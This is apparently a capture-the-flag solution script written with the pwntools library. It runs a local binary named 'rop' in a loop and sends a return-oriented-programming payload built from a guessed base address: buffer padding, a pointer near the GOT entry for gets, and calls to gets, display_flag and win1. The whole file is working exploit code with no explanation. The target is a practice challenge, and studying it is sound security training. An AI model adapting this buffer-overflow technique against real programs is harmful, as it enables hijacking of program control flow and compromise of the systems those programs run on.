#!/usr/bin/env python

from pwn import *

while True:
    r = process("./rop")
    #pause()
    r.recvuntil("Enter your input> ")

    #leapA = int(raw_input(), 16)
    leapA = 0x566456dd
    base = leapA - 0x6dd
    win1 = base + 0x2009
    display_flag = base + 0x7aa

    gets = base + 0x500
    gets_got = base + 0x1fc4

    payload = (
        "A" * 20 +
        p32(gets_got - 0x10) +
        "EEEE" +
        p32(gets) +
        p32(display_flag) +
        p32(win1)
    )

    r.sendline(payload)
    r.sendline("A" * 12)

    data = ""
    try:
        data = r.recv(1024)
    except EOFError:
        pass

    if len(data):
        print(data)
        break

    r.close()
